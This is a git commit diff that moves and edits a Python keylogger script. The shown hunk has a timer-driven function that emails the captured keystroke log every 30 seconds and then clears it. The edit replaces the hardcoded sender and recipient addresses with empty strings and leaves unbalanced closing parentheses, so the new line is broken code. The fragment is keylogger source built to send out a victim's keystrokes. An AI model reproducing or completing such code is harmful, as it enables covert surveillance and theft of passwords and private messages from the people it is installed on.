9b9c22d0c0432335f549885d389b06addaea0efd
Ergin <ergintren13@gmail.com>
2023-02-16 21:52:54 +0300

    Update and rename Scripts/Keylogger/keylogger.py to Kodlar/keylogger/keylogger.py

--- Kodlar/keylogger/keylogger.py
+++ Kodlar/keylogger/keylogger.py
@@ -34,7 +34,7 @@ def calback_func(key):
 
 def theading():
     global log
-    Send_mail("ergintren13@outlook.com","ergintren13@outlook.com",log.encode("utf-8"))
+    Send_mail ( "" , "" , log . encode ( "utf-8" )) ) )
     time = threading.Timer(30,theading)
     log = ""
     time.start()
